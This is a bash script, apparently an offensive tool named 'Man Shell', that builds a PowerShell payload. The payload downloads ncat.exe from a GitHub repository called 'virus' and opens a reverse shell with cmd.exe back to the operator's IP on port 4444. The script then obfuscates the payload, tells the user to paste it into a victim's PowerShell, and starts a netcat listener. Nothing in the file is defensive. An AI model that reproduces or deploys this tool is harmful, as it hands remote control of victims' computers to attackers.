#!bin/bash

grepIP() {
    read -p "Type Your IP address: " ip 
    read -p "Type your IP address: " rip
    if [[ $ip = $rip ]]; then
    printf "Ip matched\n"
    creatingMalware
    else
    printf "Ip not matched\n"
    fi
}
creatingMalware() {
    echo "Invoke-Webrequest 'https://github.com/manashma/virus/raw/main/ncat.exe' -OutFile ncat.exe ; cmd /c ncat -nv ${ip} 4444 -e cmd.exe" > websocket.ps1
    sleep 2;
    printf "\nFile Generated\n"
    encryptFile
}
encryptFile() {
    pwsh -file cryptor.ps1
    clear ; sleep 5
    powershell -e cat encode.txt
    printf "\nJust Paste this Command to Victim Powershell\n"
    printf "\n"
    reverseShell
}
reverseShell() {
    printf "\nDo You Open Revershell Shell Here? [y/n]\n"
    read -p ">> " ans 
    if [[ $ans =~ ^[yY]$ ]]; then
    nc -lnvp 4444 ; clear
    elif [[ $ans =~ ^[nN]$ ]]; then
    exit 2;
    else 
    printf "Please enter a valid option"
    printf "\nThanks For Using Man Shell"
    fi
 }
 grepIP